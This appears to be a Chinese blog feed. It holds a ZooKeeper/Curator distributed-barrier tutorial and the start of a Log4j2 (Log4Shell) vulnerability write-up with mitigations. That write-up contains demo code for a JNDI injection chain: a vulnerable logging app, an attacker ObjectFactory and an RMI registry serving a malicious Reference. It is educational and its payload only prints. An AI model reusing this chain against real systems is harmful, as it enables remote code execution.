class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.radarsoft.barrier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.CreateMode;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.KeeperException;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.WatchedEvent;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.Watcher;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.Watcher.Event.EventType;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.Watcher.Event.KeeperState;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.ZooDefs;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.ZooDefs.Ids;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.ZooKeeper;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.data.Stat;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BarrierQueue</span> <span class="keyword">implements</span> <span class="title">Watcher</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String Addr = <span class="string">"zk集群地址"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String root = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ZooKeeper zk = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> CountDownLatch countDownLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BarrierQueue</span><span class="params">(String root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.root = root;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 连接zk服务器</span></span><br><span class="line">            zk = <span class="keyword">new</span> ZooKeeper(Addr, <span class="number">3000</span>, <span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">if</span> (zk != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 建立根目录节点</span></span><br><span class="line">                Stat s = zk.exists(root, <span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (s == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    zk.create(root, <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>], ZooDefs.Ids.OPEN_ACL_UNSAFE,</span><br><span class="line">                            CreateMode.PERSISTENT);</span><br><span class="line">                    zk.setData(root, <span class="string">"10"</span>.getBytes(), -<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(String path,CountDownLatch countDownLatch)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">null</span> != zk)&#123;</span><br><span class="line">                <span class="comment">// 设置一个监控的标志,当大小为10时,所有子节点都已经创建完毕,进行主流程处理</span></span><br><span class="line">                zk.exists(root + <span class="string">"/start"</span>, <span class="keyword">true</span>);</span><br><span class="line">                zk.create(path, <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>], ZooDefs.Ids.OPEN_ACL_UNSAFE,CreateMode.EPHEMERAL_SEQUENTIAL);</span><br><span class="line">                List&lt;String&gt; list = zk.getChildren(root, <span class="keyword">false</span>);</span><br><span class="line">                System.out.println(<span class="string">"子节点的个数:"</span> + list.size() + <span class="string">",跟节点默认参考值:"</span> + Integer.parseInt(<span class="keyword">new</span> String(zk.getData(root,<span class="keyword">false</span>, <span class="keyword">new</span> Stat()))) );</span><br><span class="line">                <span class="keyword">if</span> (list.size() &lt; Integer.parseInt(<span class="keyword">new</span> String(zk.getData(root,<span class="keyword">false</span>, <span class="keyword">new</span> Stat())))) &#123;</span><br><span class="line">                    countDownLatch.countDown();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">null</span> == zk.exists(root + <span class="string">"/start"</span>, <span class="keyword">false</span>)) &#123;</span><br><span class="line">                        zk.create(root + <span class="string">"/start"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>],Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeeperException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((root + <span class="string">"/start"</span>).equals(event.getPath())&amp;&amp; event.getType() == EventType.NodeCreated) &#123;</span><br><span class="line">            System.out.println(root + <span class="string">"/start"</span> + <span class="string">"---"</span> + <span class="string">"节点被传建了"</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                List&lt;String&gt; list = zk.getChildren(root, <span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">final</span> String node : list) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="string">"start"</span>.equals(node))&#123;</span><br><span class="line">                        System.out.println(node);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">"所以人到齐,开始吃饭"</span>);</span><br><span class="line">                countDownLatch.countDown();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (KeeperException | InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(event.getState() == KeeperState.SyncConnected)&#123;</span><br><span class="line">            latch.countDown();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZooKeeperBarrierTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> CountDownLatch countDownLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String subNode = <span class="string">"/element"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">barrier</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> BarrierQueue queue2 = <span class="keyword">new</span> BarrierQueue(<span class="string">"/queue_barrier"</span>);</span><br><span class="line">            latch.await();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                queue2.add(<span class="string">"/queue_barrier"</span> + subNode,countDownLatch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        countDownLatch.await();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="zookeeper实现分布式屏障思路"><a href="#zookeeper实现分布式屏障思路" class="headerlink" title="zookeeper实现分布式屏障思路"></a>zookeeper实现分布式屏障思路</h2><p>某个node路径为”/queue_barrier”,在该节点下有个子节点给子节点赋值为某个值,假设为10,当根路径”/queue_barrier”下的子节点个数为10时,则所有子进程都完成了任务,主进程开始执行。<br>      基于zookeeper的节点类型,创建临时连续的节点会在创建的节点后给节点名加上一个数字后缀,基于这个顺序，我们可以有如下的思路<br> 1:通过调用getData()来获取某个节点的值,假设为10<br> 2:调用getChildren()来获取所有的子节点,同时注册watcher监听<br> 3:统计子节点的个数<br> 4:将统计的个数和getData()获取的值比较,如果还不足10,就需要等待<br> 5:接收watcher通知</p><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">子节点的个数:1,跟节点默认参考值:10</span><br><span class="line">子节点的个数:2,跟节点默认参考值:10</span><br><span class="line">子节点的个数:3,跟节点默认参考值:10</span><br><span class="line">子节点的个数:4,跟节点默认参考值:10</span><br><span class="line">子节点的个数:5,跟节点默认参考值:10</span><br><span class="line">子节点的个数:6,跟节点默认参考值:10</span><br><span class="line">子节点的个数:7,跟节点默认参考值:10</span><br><span class="line">子节点的个数:8,跟节点默认参考值:10</span><br><span class="line">子节点的个数:9,跟节点默认参考值:10</span><br><span class="line">子节点的个数:10,跟节点默认参考值:10</span><br><span class="line">&#x2F;queue_barrier&#x2F;start---节点被传建了</span><br><span class="line">element0000000008</span><br><span class="line">element0000000009</span><br><span class="line">element0000000006</span><br><span class="line">element0000000007</span><br><span class="line">element0000000004</span><br><span class="line">element0000000005</span><br><span class="line">element0000000002</span><br><span class="line">element0000000003</span><br><span class="line">element0000000000</span><br><span class="line">element0000000001</span><br><span class="line">所以人到齐,开始吃饭</span><br></pre></td></tr></table></figure><p> 查看zk节点数据：所有临时节点创建完成后，start节点被创建。</p><p><img src="/img/zookeeper/barrier.png" alt=""></p><h2 id="Curator实现"><a href="#Curator实现" class="headerlink" title="Curator实现"></a>Curator实现</h2><p>代码：</p><p><code>CuratorFrameworkProperties</code>类（提供<code>CuratorFramework</code>需要的一些配置信息，以及创建<code>CuratorFramework</code>实例的方法）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kaven.zookeeper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.curator.RetryPolicy;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.CuratorFramework;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.CuratorFrameworkFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.imps.CuratorFrameworkState;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.retry.ExponentialBackoffRetry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CuratorFrameworkProperties</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 连接地址</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CONNECT_ADDRESS = <span class="string">"192.168.1.3:9000"</span>;</span><br><span class="line">    <span class="comment">// 连接超时时间</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CONNECTION_TIMEOUT_MS = <span class="number">40000</span>;</span><br><span class="line">    <span class="comment">// Session超时时间</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SESSION_TIMEOUT_MS = <span class="number">10000</span>;</span><br><span class="line">    <span class="comment">// 命名空间</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NAMESPACE = <span class="string">"MyNamespace"</span>;</span><br><span class="line">    <span class="comment">// 重试策略</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> RetryPolicy RETRY_POLICY = <span class="keyword">new</span> ExponentialBackoffRetry(<span class="number">1000</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CuratorFramework <span class="title">getCuratorFramework</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建CuratorFramework实例</span></span><br><span class="line">        CuratorFramework curator = CuratorFrameworkFactory.builder()</span><br><span class="line">                .connectString(CuratorFrameworkProperties.CONNECT_ADDRESS)</span><br><span class="line">                .retryPolicy(CuratorFrameworkProperties.RETRY_POLICY)</span><br><span class="line">                .connectionTimeoutMs(CuratorFrameworkProperties.CONNECTION_TIMEOUT_MS)</span><br><span class="line">                .sessionTimeoutMs(CuratorFrameworkProperties.SESSION_TIMEOUT_MS)</span><br><span class="line">                .namespace(CuratorFrameworkProperties.NAMESPACE)</span><br><span class="line">                .build();</span><br><span class="line">        curator.start();</span><br><span class="line">        <span class="keyword">assert</span> curator.getState().equals(CuratorFrameworkState.STARTED);</span><br><span class="line">        <span class="keyword">return</span> curator;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>DistributedDoubleBarrierRunnable</code>类（实现了<code>Runnable</code>接口，模拟分布式节点进入与离开分布式屏障）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kaven.zookeeper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.SneakyThrows;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.CuratorFramework;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.recipes.barriers.DistributedDoubleBarrier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributedDoubleBarrierRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="meta">@SneakyThrows</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使用不同的CuratorFramework实例，表示不同的分布式节点</span></span><br><span class="line">        CuratorFramework curator = CuratorFrameworkProperties.getCuratorFramework();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟随机加入的分布式节点</span></span><br><span class="line">        <span class="keyword">int</span> randomSleep = <span class="keyword">new</span> Random().nextInt(<span class="number">20000</span>);</span><br><span class="line">        Thread.sleep(randomSleep);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分布式屏障的路径</span></span><br><span class="line">        String barrierPath = <span class="string">"/kaven"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建DistributedDoubleBarrier实例，用于提供分布式屏障功能</span></span><br><span class="line">        DistributedDoubleBarrier barrier = <span class="keyword">new</span> DistributedDoubleBarrier(curator, barrierPath, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">" 等待进入屏障"</span>);</span><br><span class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">        <span class="comment">// 等待进入屏障</span></span><br><span class="line">        barrier.enter();</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">" 等待了 "</span></span><br><span class="line">                + (System.currentTimeMillis() - start) / <span class="number">1000</span> + <span class="string">" s"</span>);</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">" 进入屏障"</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="comment">// 等待离开屏障</span></span><br><span class="line">        barrier.leave();</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">" 离开屏障"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ExecutorService EXECUTOR_SERVICE = Executors.newCachedThreadPool();</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">barrier</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 分布式节点处理业务</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        EXECUTOR_SERVICE.execute(<span class="keyword">new</span> DistributedDoubleBarrierRunnable());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><p>模拟<code>5</code>个分布式节点进入与离开分布式屏障，输出如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pool-1-thread-3 等待进入屏障</span><br><span class="line">pool-1-thread-5 等待进入屏障</span><br><span class="line">pool-1-thread-2 等待进入屏障</span><br><span class="line">pool-1-thread-1 等待进入屏障</span><br><span class="line">pool-1-thread-4 等待进入屏障</span><br><span class="line">pool-1-thread-4 等待了 0 s</span><br><span class="line">pool-1-thread-4 进入屏障</span><br><span class="line">pool-1-thread-3 等待了 9 s</span><br><span class="line">pool-1-thread-3 进入屏障</span><br><span class="line">pool-1-thread-2 等待了 6 s</span><br><span class="line">pool-1-thread-2 进入屏障</span><br><span class="line">pool-1-thread-1 等待了 5 s</span><br><span class="line">pool-1-thread-1 进入屏障</span><br><span class="line">pool-1-thread-5 等待了 8 s</span><br><span class="line">pool-1-thread-5 进入屏障</span><br><span class="line">pool-1-thread-1 离开屏障</span><br><span class="line">pool-1-thread-3 离开屏障</span><br><span class="line">pool-1-thread-5 离开屏障</span><br><span class="line">pool-1-thread-2 离开屏障</span><br><span class="line">pool-1-thread-4 离开屏障</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞介绍及demo</title>
      <link href="/2021/12/14/log4j2%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8Ademo/"/>
      <url>/2021/12/14/log4j2%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8Ademo/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞评级及影响版本"><a href="#漏洞评级及影响版本" class="headerlink" title="漏洞评级及影响版本"></a>漏洞评级及影响版本</h3><p>Apache Log4j远程代码执行漏洞 严重</p><p>影响的版本范围：Apache Log4j 2.x &lt;= 2.14.1</p><h3 id="Log4j2漏洞修复方案"><a href="#Log4j2漏洞修复方案" class="headerlink" title="Log4j2漏洞修复方案"></a>Log4j2漏洞修复方案</h3><p>升级Log4j2最新的包</p><p><a href="https://logging.apache.org/log4j/2.x/download.html" target="_blank" rel="noopener">https://logging.apache.org/log4j/2.x/download.html</a></p><p>临时解决方案</p><p>（1） 修改项目 jvm 参数：-Dlog4j2.formatMsgNoLookups=true</p><p>（2） 修改log4j2配置参数：log4j2.formatMsgNoLookups=True</p><p>（3）修改系统环境变量：FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p><h3 id="Demo演示"><a href="#Demo演示" class="headerlink" title="Demo演示"></a>Demo演示</h3><p>demo地址：<a href="https://github.com/raineddown/log4j2-bug" target="_blank" rel="noopener">https://github.com/raineddown/log4j2-bug</a></p><p>代码演示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 被攻击者应用程序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Logger log = LogManager.getLogger(App<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(String username)</span></span>&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">        log.error(<span class="string">"&#123;&#125;,注册了账号"</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 攻击者</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Attack</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">"静态代码块攻击"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"你被攻击了"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"【攻击者】"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 伪造资源服务</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 1. 注册一个jndi 服务</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"remote.Attack"</span>,<span class="string">"remote.Attack"</span>,<span class="keyword">null</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line"></span><br><span class="line">        registry.bind(<span class="string">"remote"</span>,referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">"remote start........."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击测试类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 